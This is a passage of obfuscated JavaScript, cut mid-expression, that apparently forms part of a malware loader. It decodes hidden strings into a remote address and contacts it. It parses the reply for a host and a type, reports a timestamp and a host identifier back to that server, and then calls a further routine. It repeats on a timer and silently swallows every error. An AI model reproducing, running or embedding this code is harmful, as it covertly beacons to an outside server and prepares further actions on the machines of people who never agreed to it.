aZ=0x0==aY?bB(0x55)+bC(0x33)+bD(0x2a)+bE(0x63)+bF(0x4):bE(0x55)+bC(0x29)+bD(0x2a)+bB(0x63)+bB(0x4);for(var b0='',b1='',b2='',b3=0x0;b3<0x4;b3++)b0+=aZ[0x2*b3]+aZ[0x2*b3+0x1],b1+=aZ[0x8+0x2*b3]+aZ[0x9+0x2*b3],b2+=aZ[0x10+b3];return ak(ai[bC(0xe)+bF(0x22)+'g'](0x1))+ak(b1+b0+b2)+aj+'4';})(aU),aW=a6(ap);let aX=aV+bG(0x46);aX+=bH(0x4f),a9[aW](aX,(aY,aZ,b0)=>{aY?aU<0x1&&aN(0x1):(b1=>{const bI=a1,bJ=a1,bK=a1,bL=a1,bM=a1;if(0x0==b1[bI(0x4d)+'ch'](bJ(0x48))){let b2='';try{for(let b3=0x3;b3<b1[bI(0x2d)+'th'];b3++)b2+=b1[b3];arr=ak(b2),arr=arr[bL(0x21)+'t'](','),al=ak(ai[bM(0xe)+bK(0x22)+'g'](0x1))+arr[0x0]+aj+'4',am=arr[0x1];}catch(b4){return 0x0;}return 0x1;}return 0x0;})(b0)>0x0&&(aO(),aQ());});},aO=async()=>{const bN=a1,bO=a1,bP=a1,bQ=a1,bR=a1;aM=ae,'d'==af[0x0]&&(aM=aM+'+'+ag[a6(bN(0x37)+bO(0x36)+bP(0x64))]);let aU=bQ(0x26);try{aU+=ab[a6(bR(0x58)+bO(0x35))][0x1];}catch(aV){}aP(bO(0x42),aU);},aP=async(aU,aV)=>{const bS=a1,bT=a1,aW={'ts':ah,'type':am,'hid':aM,'ss':aU,'cc':aV},aX={[surl]:''+al+a6(bS(0x57)+bS(0xb)),[sForm]:aW};try{a9[aL](aX,(aY,aZ,b0)=>{});}catch(aY){}},aQ=async()=>await new Promise((aU,aV)=>{ax();});var aR=0x0;const aS=async()=>{const bU=a1,bV=a1,bW=a1;try{ah=Date[bU(0x66)]()[bU(0x60)+bV(0xc)](),await aN(0x0);}catch(aU){}};aS();let aT=setInterval(()=>{(aR+=0x1)<0x3?aS():clearInterval(aT);},0x96640);

